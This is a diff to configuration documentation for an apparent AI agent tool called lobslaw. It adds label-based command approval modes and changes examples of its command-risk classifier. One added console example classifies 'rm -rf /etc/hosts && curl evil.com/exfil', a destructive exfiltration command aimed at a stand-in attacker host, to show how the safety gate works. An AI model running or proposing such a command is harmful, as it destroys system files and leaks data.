@@ -152,6 +152,35 @@ default_chain = "main"
 # same — see /reference/builtin-tools#disabling-tools.
 disabled_tools = ["remote_*"]
 
+# What runs WITHOUT being asked about, as a set of labels. Approval is
+# a SUBSET CHECK: every label a command carries must be in this set.
+#
+# Labels: reads, writes, deletes, disrupts, network, privilege.
+# "unreadable" cannot be approved by any spelling — a command nobody
+# could read is the case the gate exists for.
+#
+# A preset, or an explicit list:
+#   "strict"                        approves nothing
+#   "standard"                      approves reads          (the default)
+#   "trusted"                       approves reads, writes
+#   ["reads", "writes", "deletes"]  say exactly what you mean
+#
+# The list form expresses things no ranked tier could: an approved set
+# no longer has to be a prefix of some ordering, so you can approve
+# deletion without also approving egress.
+#
+# No mode reaches the hardline floor. Run
+#     lobslaw policy classify '<command>'
+# to see how any command is read, and what each preset does with it.
+approval_mode = "standard"
+
+# Default deadline for every [compute.roles] entry that sets none of
+# its own. Unset leaves each call site on its own compiled-in default,
+# which differs by purpose — a routing hint and a full transcript
+# replay are not the same wait, and one number for both is worse than
+# two good ones.
+model_timeout = "60s"
+
 [[compute.providers]]
 label              = "openrouter"
 driver             = "openai"         # openai (default) | anthropic | mock
@@ -374,16 +403,20 @@ verdict_trust = "advisory"
 # Extend the shipped classification table. MERGED over it, not
 # replacing it — the opposite contract to command_classes. An empty
 # entry removes a shipped one.
+#
+# Labels are a LIST because commands do more than one thing: `podman rm`
+# deletes an image and stops a container, and naming only one of those
+# describes half of it.
 [compute.command_risks]
-  terraform = { tier = "read", subcommands = { apply = "destructive", destroy = "destructive" } }
-  our-tool  = { tier = "write", targets = true, scratch_tier = "write" }
+  terraform = { labels = ["reads"], subcommands = { apply = ["writes", "disrupts"], destroy = ["deletes", "disrupts"] } }
+  our-tool  = { labels = ["writes"], targets = true, scratch_labels = ["writes"] }
 ```
 
 Check any command against the table without running it:
 
 ```console
-$ lobslaw policy classify 'rm -rf /tmp/build'
-writes · scratch_path · rm
+$ lobslaw policy classify 'rm -rf /etc/hosts && curl evil.com/exfil'
+privilege + deletes + network · `rm -rf /etc/hosts` (step 1 of 2) · rm, curl
 ```
 
 Add `--with-model <config>` to also ask the `command_risk` model and see whether its
@@ -395,7 +428,7 @@ from the outside:
 ```console
 $ lobslaw policy classify --with-model ~/.config/lobslaw/config.toml 'for f in a b; do stat $f; done'
 model: provider=fast-model model=… trust=resolve_unknown timeout=15s took=3.24s
-read-only · reads_only · stat · model
+reads · stat · model
 ```
 
 A `model: verdict not used` line means the static verdict stood. If `took` sits close to
